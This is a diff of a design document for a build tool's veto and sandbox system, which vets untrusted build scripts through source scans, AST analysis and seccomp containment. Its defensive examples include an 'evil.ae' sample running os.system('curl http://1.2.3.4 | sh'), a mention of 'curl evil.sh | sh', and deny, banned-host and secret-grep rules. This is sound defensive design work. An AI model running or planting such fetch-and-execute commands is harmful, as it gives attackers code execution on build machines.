@@ -1,55 +1,46 @@
 # Build veto and sandbox — vetting and containing an untrusted build
 
-Status: **partially shipped.** Tier-A (layer 1a) is in `lib/agent`; the
-**2b AST-veto vertical slice is shipped in `lib/veto`** (consumes
-`aetherc --emit=ast`, shipped in aether v0.226.0 — verified end-to-end:
-vetoes a real `extern syscall`/`os.system`, clears clean code, fail-closes
-on no-AST). The **policy-DSL front end is shipped** in `lib/veto`
-(`veto.policy`/`deny`/`banned`/`allow_exec`/`allow_import`/`scope` → the rule
-list `decide()` consumes; an out-of-tree `policy.ae`, self-vetting via the
-compiler). **`aeb --vet` is now a real launch mode** (`tools/aeb-vet` gate +
-trampoline `--vet [--veto-policy <path>]`): resolves the policy
-(`--veto-policy` → `$AEB_HOME/veto/default.ae` → built-in default), refuses an
-in-tree policy, enforces the zero-rules lint, runs the veto per named target,
-and exits 3 (refused) before any build. Layers 1b/3 and Tiers B/C remain
-design. Companion to
-[`run-policy-class-and-cloud-leverage.md`](run-policy-class-and-cloud-leverage.md)
-(the sovereign-agent + policy-class design) and
-[`directions.md`](directions.md) (where this sits in the rings).
+aeb can treat its own build input as **untrusted**, on demand, and refuse or
+contain a build the way the untrusted `.ae` graph cannot override. This doc is
+the reference for that capability: what it inspects, the CLI, the operator
+policy surface, and — crucially — the boundary of what it can and cannot
+promise.
 
-> **Renamed from `veto-alternates.md` and broadened.** The original was
-> "how a remote `aeb-agent` decides via `maybe_veto_build`." This doc keeps
-> all of that (the agent is the sharpest case — it builds *internet-supplied*
-> trees) but recasts it as a **general aeb capability**: an opt-in launch
-> mode (`aeb --vet …` and `aeb-agent --vet …`) that **vets the build and
-> can veto it in a way the untrusted `.ae` script and source set cannot
-> override.** Same mechanism whether the untrusted tree arrived by dispatch
-> or is just a repo you don't fully trust.
+Companion docs: [`run-policy-class-and-cloud-leverage.md`](run-policy-class-and-cloud-leverage.md)
+(the sovereign-agent + policy-class design — the agent is the sharpest case,
+since it builds *internet-supplied* trees) and [`directions.md`](directions.md)
+(where this sits in the rings).
+
+> History note: this doc was formerly organized as a numbered build-order
+> (`layers 0/1a/1b/2b/3`, `tiers A/B/C`). Those numbers were the *sequence we
+> built things in*; they are retired here in favour of capability names. The
+> old labels still appear in the CHANGELOG and git history — the mapping is in
+> "The capabilities at a glance" below.
 
 ## Why aeb itself is a supply-chain surface
 
-The motivating threat (sharpened by the June-2026 npm wave —
-binding.gyp "Phantom Gyp" execution, preinstall/postinstall credential
-harvesters, self-spreading worms that target CI/CD secrets and even inject
-backdoors into AI coding assistants): **an attacker who controls the build
-description gets code execution at *build time* on the agent or dev box.**
-For aeb the build description is the `.build.ae` graph, every `.ae` it
-imports, and anything in the source set a build step reads (a `binding.gyp`,
-a vendored `package.json` with a `postinstall`, a `regen` that shells out).
-aeb is not immune by being Aether-native — a malicious `.build.ae` can
-`os.system("curl … | sh")`, declare `extern syscall`, or reach the network
-just as a malicious `package.json` can.
+The motivating threat (sharpened by the June-2026 npm wave — `binding.gyp`
+"Phantom Gyp" execution, pre/postinstall credential harvesters, self-spreading
+worms that target CI/CD secrets and even inject backdoors into AI coding
+assistants): **an attacker who controls the build description gets code
+execution at *build time* on the agent or dev box.** For aeb the build
+description is the `.build.ae` graph, every `.ae` it imports, and anything in
+the source set a build step reads (a `binding.gyp`, a vendored `package.json`
+with a `postinstall`, a `regen` that shells out). aeb is not immune by being
+Aether-native — a malicious `.build.ae` can `os.system("curl … | sh")`,
+declare `extern syscall`, or reach the network just as a malicious
+`package.json` can.
 
-So aeb needs to be able to **treat its own build input as untrusted**, on
-demand. That is what `--vet` is.
+So aeb needs to **treat its own build input as untrusted**, on demand. That is
+what `--vet` and `--sandbox` are.
 
 (Disambiguation: the policy-class doc also says "veto", but that's the
-*token/claim* veto — refusing an unauthenticated or over-scoped dispatch at
-the door. This doc is the *build-content* veto — having prepared the tree,
-does policy permit *this build* to run. Two different gates: auth-veto at the
-door, build-veto after prepare.)
+*token/claim* veto — refusing an unauthenticated or over-scoped dispatch at the
+door. This doc is the *build-content* veto — having prepared the tree, does
+policy permit *this build* to run. Two different gates: auth-veto at the door,
+build-veto after prepare.)
 
-## The load-bearing invariant — the veto runs in the trusted harness
+## The load-bearing invariant — enforcement lives in the trusted harness
 
 The single property everything here depends on:
 
@@ -58,928 +49,394 @@ The single property everything here depends on:
 > re-declare.** A verdict reached by the trusted side cannot be overridden by
 > the code it is about to compile or run.
 
-This is why a `.build.ae` "self-certifying" is worthless, and why the
-enforcement points are all *outside* the untrusted graph's reach:
+This is why a `.build.ae` "self-certifying" is worthless, and why every
+enforcement point is *outside* the untrusted graph's reach:
 
-- **1a/1b** (tree scan / external tool) run on the *source bytes*, before
-  `ae` ever compiles them — the untrusted code has not executed.
-- **2b** (AST analysis, **shipped**) — **`ae` itself** (the trusted compiler)
-  emits the typed AST via `--emit=ast`, and `lib/veto` walks it before the
-  run-compile. The untrusted graph can't veto its own veto: it neither
-  produces the AST (the compiler does) nor reaches the policy that reads it.
-- **3** (sandbox) wraps the build via the container/contained split from
-  [`../aether/docs/containment-sandbox.md`](../../aether/docs/containment-sandbox.md):
-  the harness configures grants in a trailing block (full access); the
-  untrusted build runs in a hoisted closure / a `spawn_sandboxed` child that
-  **cannot reach the grant list** — it is structurally unable to widen its
-  own permissions.
+- **Source scans** (tree/patch rules, external scanners) run on the *source
+  bytes*, before `ae` ever compiles them — the untrusted code has not executed.
+- **The AST veto** has **`ae` itself** (the trusted compiler) emit the typed
+  AST via `--emit=ast`; `lib/veto` walks it before the run-compile. The
+  untrusted graph can't veto its own veto: it neither produces the AST (the
+  compiler does) nor reaches the policy that reads it.
+- **The SBOM/intent traces** resolve coordinates / record intent in the
+  harness; the build's effects never fire.
+- **The sandbox** wraps the build in a `spawn_sandboxed` child whose grant list
+  lives in shared memory the child *cannot reach* — it is structurally unable
+  to widen its own permissions.
 
-`--vet` is an operator decision at launch; a dispatch or a `.build.ae`
-cannot clear it.
+`--vet`/`--sandbox` is an operator decision at launch; a dispatch or a
+`.build.ae` cannot clear it.
 
-## The enforcement layers, end to end
+## The capabilities at a glance
 
-You can use any subset; the strong build uses **1 + 2b + 3** (and 1 is
-itself 1a + 1b). Earliest to latest in the build's life:
+Six complementary capabilities, each named by **what it inspects or
+enforces**. Use any subset; a strong build composes the static vetoes with the
+runtime sandbox. They run earliest-to-latest in the build's life:
+
+| Capability | CLI | What it inspects / does | Reads | (former label) |
+|---|---|---|---|---|
+| **Tree & patch rule scan** | agent-side (`lib/agent`) | regex/file/path/size rules over the source bytes / the applied patch | source bytes | 1a / Tier A |
+| **External-scanner hook** | `--vet-tool '<cmd>'` | run an operator-chosen scanner (semgrep, a secret/CVE tool); non-zero exit vetoes | source tree | 1b |
+| **AST veto** | `--vet [--veto-policy <f>]` | walk `aetherc --emit=ast`: deny extern/exec/net/import, banned substrings, a coordinate allowlist | resolved AST symbols | 2b |
+| **Dependency SBOM / CVE** | `--resolve-only [--sbom-json <f>]` | resolve the dependency-coordinate closure (transitive) without building; a scanner judges it | which dep *versions* | Tier B |
+| **Intent trace** | `--trace-intent [--intent-json <f>]` | run against a doppelganger `std.os` that *records* `os.system`/`exec`/`run*` instead of executing — what the build *would do* | build *behaviour* | Tier C |
+| **Runtime sandbox** | `--sandbox [--sandbox-profile <f>]` | run the build under `spawn_sandboxed` (LD_PRELOAD + kernel seccomp); a denied syscall dies at the libc/kernel boundary | runtime syscalls | 3 |
+
+The static vetoes (everything but the sandbox) *read and decide*; the sandbox
+*enforces* on the running build what the readers couldn't see. Why both are
+needed is the subject of "Veto is policy; containment is enforcement" below.
 
 ```
 untrusted tree on disk
    │
-   ├─[1a] regex / pattern scan of source bytes        (lib/agent _veto_run_rules — HAVE)
-   ├─[1b] call an external tool on the source         (e.g. a python3 scanner — DESIGN)
-   │        (semgrep, a CVE/secret scanner, a custom .py — exit code = verdict)
+   ├─ tree & patch rule scan      (source bytes — agent-side)
+   ├─ external-scanner hook        (--vet-tool: semgrep/CVE/secret; exit code = verdict)
+   ├─ dependency SBOM / CVE        (--resolve-only: resolve closure, scanner judges)
+   ├─ intent trace                 (--trace-intent: doppelganger std.os records intent)
    │
-   ae compile each .ae → .c
-   │
-   ├─[2a] grep the generated .c for symbol calls       (stopgap — superseded by 2b)
-   ├─[2b] aetherc --emit=ast → aeb walks the AST       (SHIPPED — lib/veto)
-   │        extern / os.system / net / import — aeb decides on the emitted AST
+   ae compile each .ae → .c        (the AST veto runs here, on --emit=ast)
+   ├─ AST veto                     (--vet: extern/exec/net/import/banned/coord on the AST)
    │
    gcc link → per-node orchestrator binary
    │
-   └─[3]  spawn_sandboxed(grants, _ae_build_all, label)  (runtime containment — DESIGN)
-            deny-by-default: no tcp, no cred env, exec allowlist
+   └─ runtime sandbox              (--sandbox: spawn_sandboxed, deny-by-default, no tcp,
+                                    seccomp fork/clone fence — contains the whole subtree)
 ```
 
-### Layer 1 — source scan (cheap, pre-compile). Two sub-forms.
-
-**1a — regex / pattern scan (HAVE).** The `lib/agent` `_veto_run_rules`
-engine: a data-driven `id\tscope\tpattern\treason` rule list over the tree
-or the patch. Extend with the June-2026 patterns — a `binding.gyp` present
-in the tree, `preinstall`/`postinstall` in a vendored manifest, a literal
-`curl … | sh`, an `extern` line in a user `.ae`. **Strength:** catches the
-blatant, requester can't disable. **Limit (load-bearing, see the policy/
-containment section):** bounded by what it can read as *text* — defeated by
-`"os"+".system"`, base64, runtime-fetched payloads. A tripwire, not a wall.
-
-**1b — call an external tool on the source (DESIGN).** Rather than only
-aeb-internal regex, `--vet` can shell out to a **dedicated scanner** the
-operator chooses — a `python3` script, `semgrep`, a secret/CVE scanner, an
-org's house tool — passing it the tree/patch path; **non-zero exit = veto.**
-This is the pragmatic escape hatch: aeb doesn't try to be a SAST engine, it
-*invokes* one. Same trusted-harness invariant (the tool runs in the harness,
-not in the build). The tool itself is attack surface and must be a pinned,
-operator-controlled binary — not something pulled from the untrusted tree.
-
-### Layer 2 — structural / AST inspection. The `.c`-vs-AST question, resolved.
-
-The design question — inspect the **generated `.c`** or the **Aether AST**? —
-is settled in favour of the AST (2b, shipped). Both options, for the record:
-
-- **2a — grep the generated `.c` (stopgap, no aether change).** After
-  `ae file.ae → file.c`, scan the C for `os_system(` / `*_connect(` /
-  `dlopen(` symbol calls. Better than 1a (sees post-codegen calls regardless
-  of how the Aether string was spelled) but **wrong altitude**: C conflates
-  user intent with emitted runtime scaffolding, and you've lost which
-  *import* / which user-vs-SDK code a call came from. Usable today; noisy.
-- **2b — AST analysis: `ae` emits, *aeb* decides (the real answer — SHIPPED).**
-  The compiler builds a typed, name-resolved AST (`AST_FUNCTION_CALL`,
-  `AST_EXTERN_FUNCTION`, `AST_IMPORT_STATEMENT`). The split, now both halves
-  in place:
-  - **aether's job (shipped, aether v0.226.0+):** one generic primitive —
-    **`aetherc --emit=ast`** — dumps the name-resolved AST as stable JSON,
-    each node carrying `kind`/`file`/`line` and, for calls, the **resolved
-    callee symbol** (e.g. `os_system` regardless of how the receiver was
-    spelled — aliasing/concat can't dodge a resolved binding; that's why this
-    beats regex and 2a). Reusable beyond veto (`aeb query`/`rdeps` want it too).
-    Designed in `../aether/veto-enhancements.md`.
-  - **aeb's job (shipped, `lib/veto`):** owns the **policy and the decision** —
-    `decide()` walks that AST against operator rules and vetoes. aeb does *not*
-    push categories into the compiler; the deny/allow policy is an aeb-side
-    out-of-tree policy `.ae` DSL (see "The policy surface" below). What aeb
-    vetoes today: any **`extern`** in the untrusted graph (the bypass the
-    containment doc flags, minus a safe-runtime allowlist), `os.*` **exec**,
-    and — when a rule is set — **net** (`tcp`/`http_*` family) and forbidden
-    **imports**.
-
-  *On net + arguments (see "Call arguments" below): the emit carries literal
-  call arguments (`args[]`) and `lib/veto` now **consumes them** — a literal
-  coordinate/URL is readable (the `banned\t<substring>` rule matches it), a
-  computed argument to an exec/net call **fail-closes**, and layer 3 remains the
-  host-level backstop for the computed case.*
-
-  This is **Tier C's intent ("read what the build would do") realized via the
-  compiler's own AST instead of a doppelganger** — stronger than Tier C (sees
-  *all* code, not just builder calls) and it keeps the veto logic in aeb's
-  trusted `.ae`. It composes with the containment doc's "proposed fix:
-  compiler-enforced extern check" — same node, `AST_EXTERN_FUNCTION` — but aeb
-  applies it as *policy* rather than the compiler hardcoding it. **2a (`.c`
-  grep) is now superseded** (it was the stopgap until `--emit=ast` shipped);
-  **Tier C's `--lib` doppelganger** (below) remains a parallel, aeb-only route
-  to the same "read the build's intent" goal that needs no aether change.
-
-#### What the emitted AST actually looks like
-
-These are **real `aetherc --emit=ast` outputs** (v0.226.0+), pretty-printed
-from the one-line JSON the compiler emits to stdout. This is exactly what
-`lib/veto`'s `decide()` walks.
-
-**An evil tree** — declares `extern syscall` and shells out:
-
-```aether
-// evil.ae
-import std.os
-extern syscall(n: int) -> int
-main() {
-    os.system("curl http://1.2.3.4 | sh")
-    syscall(1)
-}
-```
-
-```console
-$ aetherc --emit=ast evil.ae        # exit 0
-```
-```json
-{"nodes": [
-  {"kind": "import_statement", "file": "evil.ae", "line": 1, "module": "std.os"},
-  {"kind": "extern_function",  "file": "evil.ae", "line": 2, "name": "syscall"},
-  {"kind": "function_call",    "file": "evil.ae", "line": 4, "callee": "os_system"},
-  {"kind": "function_call",    "file": "evil.ae", "line": 5, "callee": "syscall"}
-]}
-```
-
-How `lib/veto` reads it under the default policy (deny `extern` + deny
-`exec`): the `extern_function` `syscall` node **vetoes immediately**
-(`denied extern: syscall (evil.ae) (veto:extern)`) — and the
-`function_call` `os_system` would too (deny `exec`). Note `os.system(...)`
-surfaced as the **resolved callee `os_system`**, not the source spelling —
-that's the property that makes alias/concat obfuscation useless against 2b.
-
-**A clean tree** — only stdlib, no dangerous extern:
-
-```aether
-// clean.ae
-import std.string
-extern println(s: string)
-main() {
-    x = string.concat("hello ", "world")
-    println(x)
-}
-```
-
-```console
-$ aetherc --emit=ast clean.ae       # exit 0
-```
-```json
-{"nodes": [
-  {"kind": "import_statement", "file": "clean.ae", "line": 1, "module": "std.string"},
-  {"kind": "extern_function",  "file": "clean.ae", "line": 2, "name": "println"},
-  {"kind": "function_call",    "file": "clean.ae", "line": 4, "callee": "string_concat"},
-  {"kind": "function_call",    "file": "clean.ae", "line": 5, "callee": "println"}
-]}
-```
-
-This **clears**: `string_concat` isn't in the `exec`/`net` families, and the
-`extern println` is on `lib/veto`'s known-safe runtime-extern allowlist
-(`println`/`print`/`exit`/`panic`/`assert`). *A blanket "deny all extern"
-would false-positive here — the live smoke caught exactly this, which is why
-the allowlist exists. A specific `extern\tprintln` rule still overrides it.*
-
-**A selective import** — `import X (a, b)` surfaces `selected[]`, and the
-bare call still resolves to its canonical binding:
-
-```aether
-// sel.ae
-import std.string (concat)
-extern println(s: string)
-main() { println(concat("a", "b")) }
-```
-
-```json
-{"nodes": [
-  {"kind": "import_statement", "file": "sel.ae", "line": 1,
-   "module": "std.string", "selected": ["concat"]},
-  {"kind": "extern_function",  "file": "sel.ae", "line": 2, "name": "println"},
-  {"kind": "function_call",    "file": "sel.ae", "line": 3, "callee": "println"},
-  {"kind": "function_call",    "file": "sel.ae", "line": 3, "callee": "string_concat"}
-]}
-```
-
-Even though the source wrote bare `concat(...)`, the call node carries
-`callee: "string_concat"` — the resolved binding. A `deny import std.string`
-rule would match the `import_statement` node; an `allow_import` allowlist uses
-the same `module` field (and `selected[]` to distinguish whole-module from
-single-name imports).
-
-**Other node fields** (elided from the three examples above for focus):
-every `function_call` also carries an **`args[]`** array — covered in its own
-subsection below (it's the post-v0.227.0 addition). Plus: `extern_function`
-carries `"variadic": true` on varargs externs; an `import_statement` carries
-`"alias"` for `import X as Y` and `"glob": true` for `import X (*)`; a
-`function_call` with **no static target** (function-pointer dispatch) emits
-`"indirect": true` instead of `callee` — **`lib/veto` fail-closes on those**
-(no readable target ⇒ veto). A node whose `file` is **NULL** is
-compiler-synthesised; a deny-match on one is surfaced as `<unknown-origin>`
-rather than silently trusted or vetoed.
-
-**Fail-closed exit:** a tree that doesn't typecheck emits **no AST** and
-`aetherc --emit=ast` exits non-zero — `lib/veto` treats that as a veto
-(`veto:no-ast`), never falling through to a build.
-
-```console
-$ aetherc --emit=ast broken.ae      # has a type error
-error[E0301]: Undefined function ...
-$ echo $?
-1                                   # → lib/veto: VETO (veto:no-ast)
-```
-
-#### Call arguments — now on the wire (the literal coordinate is readable)
-
-The emit now carries each `function_call`'s **arguments** (aether `[current]`,
-post-v0.227.0 — the `veto-emit-ast-args.md` follow-up, shipped). Every call
-node has an `args[]` array, one entry per positional/named arg in source order:
-
-- `{"literal": "<value>"}` for a primitive literal (string/int/float/bool);
-- `{"computed": true}` for anything else (an identifier ref, an expression, a
-  nested call, an interpolation) — **no expression provenance**, just the
-  literal-vs-not flag, by design;
-- trailing closures / DSL builder bodies are filtered out (not args in the veto
-  sense); the array is always present (even empty), so the policy walker can
-  rely on `args` being a defined shape.
-
-Real output (installed binary):
-
-```json
-{"kind":"function_call","file":"app.ae","line":4,"callee":"os_system",
- "args":[{"literal":"curl http://1.2.3.4 | sh"}]}
-{"kind":"function_call","file":"app.ae","line":6,"callee":"os_system",
- "args":[{"computed":true}]}                     // os.system(target) — a ref
-```
-
-What this unlocks, and the discipline that keeps it safe:
-
-- **The literal coordinate is now readable.** `maven.dep("org.foo:bar:1.2.3")`
-  surfaces `args:[{"literal":"org.foo:bar:1.2.3"}]` — the input a banned/CVE
-  dependency check (Tier B) wants. And the rare literal
-  `os.system("curl … | sh")` now surfaces its **command string**, so an exec
-  rule can read the `curl` target, not just "shells out."
-- **Coordinates are written, not computed** — and string-literal `+` concat
-  *isn't even valid Aether* (the parser rejects it), so the practical case is a
-  single string literal. The literal arm is therefore near-total coverage for
-  the verb-with-coordinate shape a real `.build.ae` uses.
-- **`{"computed":true}` ⇒ veto.** A build that hands a resolver verb (or an
-  exec/net call) a non-literal argument can't be vouched for statically, so aeb
-  **fail-closes** on it. The flag carries no contents to reason about — that's
-  intentional (it keeps `--emit=ast` from drifting into a taint analyzer); the
-  decision is the same regardless of what the expression was.
-
-Origin scoping is still load-bearing here: a single user `http.get(...)`
-explodes into ~10 std-origin nodes from inside `std/http/module.ae`
-(`http_get_raw` — the actual socket — `http_response_*`, `string_concat`, …),
-all `--lib`-origin and **exempt**; only the user-file verb node trips. And the
-layered division holds: **2b reads the literal argument pre-build; layer 3's
-`connect()`/`execve()` interceptors backstop the *computed* case at the syscall**,
-seeing the resolved value regardless of how it was built.
-
-*(`lib/veto` now **consumes `args[]`** (2026-06-08): `decide()` reads each
-call's first literal arg + a has-computed flag; an exec/net call with a
-**computed** arg fail-closes (`<computed-arg>` in the reason), an exec/net veto
-names the literal command, and a new **`banned\t<substring>`** rule vetoes when
-the substring appears in any call's literal argument — the targeted
-coordinate/host/command check (`banned\tevil.com` →
-`maven.dep("…evil.com…")` / `os.system("curl …evil.com…")`). SDK-origin nodes
-stay exempt. `tests/test_veto.ae`: 57 assertions, incl. the real post-v0.227.0
-`args[]` JSON shape end-to-end. **The policy DSL is now shipped too** (see "The
-policy surface"): an out-of-tree `policy.ae` authors `deny`/`banned`/
-`allow_exec`/`allow_import`/`scope` via the `lib/veto` setters, which lower onto
-this same rule list. `allow_exec("gcc")` exempts a `gcc` command from a
-deny-exec; `allow_import` exempts a module from a deny-import; and the
-**positive coordinate allowlist** — `coord_verb("maven_dep")` +
-`coord_allow("org.corp:")` — gates a resolver verb's literal coordinate to an
-allowed leading prefix (the attacker-immovable stem), vetoing anything else and
-**fail-closing on a computed coordinate**. (`org.corporate-evil:` does NOT match
-the `org.corp:` prefix — pinned-stem matching, not loose contains.)
-`tests/test_veto_policy.ae` (21 assertions) + a live smoke. Both `aeb --vet`
-(shipped) and the agent's `maybe_veto_build` (shipped) drive this.)*
-
-### Layer 3 — runtime containment (the part the source set can't override)
-
-Covered in depth in "Veto is policy; containment is enforcement" below. The
-update for the post-`nodes-as-subprocesses` world: aeb no longer runs all
-nodes in one `main()` — `tools/aeb-driver.ae` runs **each node as a
-subprocess** (`_ae_build_all <root> <label>`). So `--vet` wraps **each
-node-subprocess** in `spawn_sandboxed(grants, _ae_build_all, label)`: the
-grant list lives in shared memory the node can't rewrite, `LD_PRELOAD`
-propagates to the node's whole child tree (gcc, javac, …), and the node —
-compiled from untrusted source — inherits a deny-by-default profile it
-cannot widen. (Not a "secret wrapper `main()`" — the *driver* wraps the
-node; same effect, cleaner seam, and it's per-node not per-whole-build.)
-
-## The policy surface — an out-of-tree policy `.ae` (DSL), not a flag list
-
-The deny/allow policy for layers 1 and 2b is **not** a CLI category-list
-(`--deny extern,exec,…`) and **not** an external `deny.toml`. Both were
-rejected:
-
-- a CLI list is **typo-prone and fails open** — `--deny exce` silently
-  enforcing nothing is the worst outcome for a security gate;
-- an external config format violates aeb's founding rule (*the `.ae` file is
-  the single source of truth; external formats only via shell-out*).
-
-So the policy is an **aeb-native closure-DSL `.ae` file**, served by a new
-`lib/veto` SDK — same *shape* as a `.build.ae`, but with one critical
-difference in **where it lives and how aeb finds it.**
-
-> **NOT a dot-prefixed in-tree target.** aeb scans every dot-prefixed `.ae`
-> under cwd and makes it a DAG **node** ("filename is the route"). A policy
-> must be the *opposite* of that — it polices the tree, so it must not be a
-> node *in* the tree, and an untrusted dispatch must not be able to ship its
-> own. So the policy file is **not** called `.veto.ae` next to `.build.ae`
-> (an earlier draft of this doc implied that — it was wrong: aeb's scanner
-> would slurp it into the graph, and the untrusted tree could supply it).
-> Instead it is a **plainly-named `.ae` at an operator-trusted, out-of-tree
-> location**, loaded *as policy* by `--vet`, never scanned as a target:
->
-> - `aeb --vet --veto-policy /etc/aeb/policy.ae` (explicit operator path), or
-> - `$AEB_HOME/veto/default.ae` (the shipped default), or
-> - `.aeb/veto/policy.ae` (per-project, under the already-non-scanned `.aeb/`
->   config dir — same trusted space as the `.aeb/lib/<sdk>` symlinks).
->
-> aeb must **refuse** a `--veto-policy` path that resolves inside the build
-> tree (the requester writing their own exemption = gate dead). The filename
-> is irrelevant *because it is not a target* — `policy.ae`, not a `.`-prefix.
-
-```aether
-// /etc/aeb/policy.ae (or $AEB_HOME/veto/default.ae) — operator policy.
-// A normal .ae aeb compiles+runs AS POLICY — NOT a dot-prefixed build node.
-// Lives outside the build tree; reviewed in PRs; version-controlled; typed.
-import veto (policy, deny, banned, allow_exec, allow_import, scope)
-main() {
-    p = veto.policy()
-
-    // --- layer 2b (AST) rules — SHIPPED ---
-    veto.deny(p, "extern")               // no raw C escapes in untrusted code
-    veto.deny(p, "net")                  // no tcp/http reach
-    veto.deny(p, "exec")                 // deny shell-out by default…
-    veto.allow_exec(p, "gcc")            // …except the toolchain
-    veto.allow_exec(p, "javac")
-    veto.allow_exec(p, "/usr/bin/ld")
-    veto.allow_import(p, "std.string")   // exempt this module from deny-import
-    veto.banned(p, "evil.com")           // substring in any literal arg → veto
-
-    veto.scope(p, "untrusted")           // recorded; default = non-`--lib` nodes
-}
-```
-
-The setters above (`deny`/`banned`/`allow_exec`/`allow_import`/`scope`,
-`policy()`/`policy_rules()`/`policy_rule_count()`) **ship today** in `lib/veto`
-and lower onto the `decide()` rule list. *Designed, not yet wired:* layer-1
-source-pattern rules (`deny("file:binding.gyp")`, `deny("pattern:curl…")` → the
-`lib/agent` `_veto_run_rules` engine) and layer-3 sandbox grants
-(`default_grants(p)` → the `spawn_sandboxed` profile) — those lower onto the
-*other* layers' engines, which aren't connected to the policy object yet. A
-single `policy.ae` is intended to drive all three layers; today it drives 2b.
-
-Three properties this buys, each answering a requirement:
-
-1. **Self-vetting / lint (the "what vets the vetter" answer).** The policy
-   `.ae` *is Aether* — `aetherc` typechecks it when aeb compiles it. A malformed
-   policy (`veto.dney(...)`, wrong arity, an unknown rule keyword the `veto`
-   SDK rejects) is a **compile error**, not a silent empty policy. aeb adds a
-   semantic lint on top: **`--vet` with a policy that resolves to zero rules is
-   itself an error** (vet-requested-but-denies-nothing → refuse, never fall
-   through). Fail-closed by construction.
-
-2. **Outside the source tree (the security property).** The policy `.ae` is
-   **operator-owned**, resolved from a trusted path (`$AEB_HOME/veto/` or an
-   operator `--veto-policy <path>`), **never from the dispatched/untrusted
-   tree**. aeb must *refuse* a policy path that resolves inside the build tree
-   — otherwise the requester writes their own exemption and the gate is dead.
-   Same provenance rule as the `--lib` SDK roots; same trust line as the
-   project-vs-toolchain import split (`LLM.md`).
-
-3. **Cached once compiled.** The policy `.ae` → compiled policy is a pure
-   content-addressed build product (`lib/cache`): key on
-   `sha256(policy.ae) + toolchain-version`, compile **once**, reuse until the
-   policy source changes. `--vet` then costs one hash check, not a
-   policy-recompile per build node. (The untrusted tree's emitted AST is
-   likewise cacheable per-node on its source hash.)
-
-### How the DSL lowers
-
-The policy `.ae` is the *front end*; the enforcement primitives are the *back
-end*. aeb compiles+runs the policy (the doppelganger move — a builder that populates
-a rule map, exactly like a `.build.ae` populates a build map), producing a
-resolved rule set, then:
-
-- layer-1 rules → the `lib/agent` `_veto_run_rules` pattern engine + the 1b
-  external-tool hook;
-- layer-2b rules → applied against `aetherc --emit=ast` output (the upstream
-  ask);
-- layer-3 grants → the per-node `spawn_sandboxed` profile.
-
-There is **no human CLI category surface** — `aeb --vet [--veto-policy <path>]`
-is the whole launch interface; absent a policy file, the **built-in default**
-fires (deny `extern`/`net`, allow the toolchain `exec` set) so the safe thing
-happens with zero config and `--vet` is never a silent no-op.
-
-### The three operator surfaces compose (and are kept separate on purpose)
-
-An operator drives three *distinct but composable* surfaces — they are
-deliberately **not** merged into one mega-policy object: each is proven and
-self-contained, each fails closed on its own, and the launch flags make the
-intent explicit. They line up one-per-layer:
-
-| Surface | Layer | Where it lives | Default |
-| --- | --- | --- | --- |
-| **veto policy** (`veto.*` rules) | 1a + 2b | `--veto-policy <f>` → `$AEB_HOME/veto/default.ae` → built-in | deny `extern`+`exec` |
-| **vet-tool(s)** (external scanners) | 1b | `--vet-tool '<cmd>'` (repeatable, CLI) | none (opt-in) |
-| **sandbox profile** (`sandbox.*` grants) | 3 | `--sandbox-profile <f>` → `$AEB_HOME/sandbox/default.ae` → built-in | conservative, **no tcp** |
-
-Both `default.ae` files are operator-trusted, **out of tree**, and refused if
-their path resolves *inside* the build tree (the sandboxed/vetted tree must
-not author its own exemption — same `_is_inside` check both gates use).
-
-A fully-armed invocation uses all three at once — static veto first
-(1a/1b/2b), then the build runs contained (3):
-
-```sh
-aeb --vet \
-    --veto-policy   /etc/aeb/veto.ae       \   # 2b: deny rules + coord allowlist
-    --vet-tool      'semgrep --error .'    \   # 1b: bring-your-own SAST
-    --vet-tool      '! grep -rq AKIA .'    \   # 1b: a second scanner
-    --sandbox \
-    --sandbox-profile /etc/aeb/grants.ae   \   # 3: deny-by-default grants (no tcp)
-    app/.build.ae
-```
-
-`--vet` and `--sandbox` are independent — use either alone, or together.
-`--veto-policy`/`--sandbox-profile`/`--vet-tool` each imply their gate, so
-naming a file/tool is enough. Each surface keeps its own `default.ae` so the
-zero-config path is safe per layer; copy a `default.ae` and tighten it for a
-custom policy (e.g. add `sandbox.grant_tcp(s, "crates.io")` for a build that
-legitimately fetches from a registry).
+---
 
 ## SCOPE — read this first, it's the whole point
 
-These vetoes guard against **build-grammar escapes**: things the
-`.build.ae` / `.tests.ae` *orchestration* does that the agent operator
-doesn't want a leased node to do — shell out to something dangerous, reach
-the network, pull a banned/known-vulnerable dependency, write outside the
-workdir, embed a secret in the tree, dispatch onward.
+These capabilities guard against **build-grammar escapes**: things the
+`.build.ae` / `.tests.ae` *orchestration* does that the operator doesn't want a
+node to do — shell out to something dangerous, reach the network, pull a
+banned/known-vulnerable dependency, write outside the workdir, embed a secret,
+dispatch onward.
 
 They do **NOT** guard against **the application being built being a trojan.**
 Nothing here inspects, or can vouch for, the runtime behaviour of the
 *compiled artifact*. A `.build.ae` that cleanly runs `javac` on Java source
-passes every veto in this doc — and that Java can still be malware. The
-veto sees *the build's intent*, not *the program's intent*.
+passes every veto in this doc — and that Java can still be malware. The veto
+sees *the build's intent*, not *the program's intent*.
 
 Stated bluntly so no one mistakes it:
 
 > **In scope:** "this *build* would `curl evil.sh | sh`, or link a CVE'd
 > dependency, or write to `/etc`." → vetoable here.
 >
-> **Out of scope:** "the binary this build produces exfiltrates data when
-> run." → NOT addressed here. That needs artifact scanning / SBOM /
-> sandboxed *execution* of the output, which is a different problem with
-> different (and weaker) guarantees.
+> **Out of scope:** "the binary this build produces exfiltrates data when run."
+> → NOT addressed here. That needs artifact scanning / sandboxed *execution* of
+> the output — a different problem with different (and weaker) guarantees.
 
-Conflating the two is how a veto framework manufactures false confidence.
-A green `maybe_veto_build` means *the build process was acceptable to the
-agent operator* — it says nothing about whether the software is safe to
-run. Keep that line bright.
+Conflating the two is how a veto framework manufactures false confidence. A
+green veto means *the build process was acceptable to the operator* — it says
+nothing about whether the software is safe to run. Keep that line bright.
 
-## Veto is policy; containment is enforcement — they are different layers
+---
 
-Before the tiers: be clear about what the veto *is*. `maybe_veto_build` is a
-**policy gate** — it inspects (the tree, the resolved closure, a recorded
-trace) and *decides* whether to proceed. Every tier in this doc is a thing
-the agent *reads and reasons about* before letting the build run.
+## The static vetoes
 
-That makes the veto fundamentally **bounded by what it can read.** Tier C's
-honest-limits section already says it: a `.build.ae` doing
-`os.system(decode(blob))` records `os.system(<computed string>)` — the veto
-can flag opacity as policy, but it *cannot read what would actually run.* A
-build that *computes* `curl evil.sh | sh` at runtime is invisible to every
-tier here. That is not a gap to be closed by a smarter veto; it is the
-nature of a read-and-decide gate.
+All of these *read and decide* before (or instead of) running the build. They
+share the trusted-harness invariant and the out-of-tree policy surface.
 
-The thing that *does* close it is **containment** — enforcing limits on the
